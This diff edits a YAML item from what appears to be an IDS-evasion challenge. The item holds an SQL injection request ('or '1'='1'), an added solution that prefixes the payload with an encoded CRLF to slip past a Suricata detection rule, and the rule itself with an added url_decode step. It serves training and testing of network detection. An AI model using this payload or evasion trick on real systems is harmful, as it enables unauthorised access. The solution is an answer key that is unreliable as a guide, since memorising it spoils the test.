@@ -17,9 +17,19 @@ base_request: |-
 
   passphrase=' or '1'='1
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Content-Length: 28
+  Content-Type: application/x-www-form-urlencoded
+
+  passphrase=%0d%0a' or '1'='1
+
+solution_note: Newline
+
 rules:
 # Newline
 - >
-  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "passphrase="; pcre: "/passphrase=.*'/"; sid:123456; rev:1;)
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; url_decode; content: "passphrase="; pcre: "/passphrase=.*'/"; sid:123456; rev:1;)
 
 expected_output: "TOP SECRET"
